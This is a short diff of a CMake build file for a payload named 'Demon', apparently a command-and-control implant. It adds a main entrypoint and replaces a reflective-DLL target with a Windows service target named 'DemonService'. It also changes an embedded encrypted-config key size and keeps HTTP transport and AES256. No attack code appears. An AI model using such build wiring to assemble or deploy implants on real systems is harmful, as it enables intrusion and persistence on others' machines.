@@ -43,14 +43,17 @@ set( LOADER_SOURCE
 )
 
 set( MAIN_SOURCE
+        # Demon Main entrypoint
+        Source/Main/Main.c
+
         # windows exe
         Source/Main/MainExe.c
 
         # windows dll
         Source/Main/MainDll.c
 
-        # windows reflective dll
-        Source/Main/MainReflectiveDll.c
+        # windows service
+        Source/Main/MainSvc.c
 )
 
 set( CRYPT_SOURCE
@@ -63,7 +66,8 @@ add_compile_definitions( DEBUG )
 add_compile_definitions( CONFIG_BYTES={} )
 add_compile_definitions( CONFIG_SIZE=1024 )
 add_compile_definitions( CONFIG_KEY_BYTES={} )
-add_compile_definitions( CONFIG_KEY_SIZE=1024 )
+add_compile_definitions( CONFIG_KEY_SIZE=16 )
+add_compile_definitions( SERVICE_NAME="DemonService" )
 
 add_compile_definitions( TRANSPORT_HTTP )
 add_compile_definitions( AES256 )
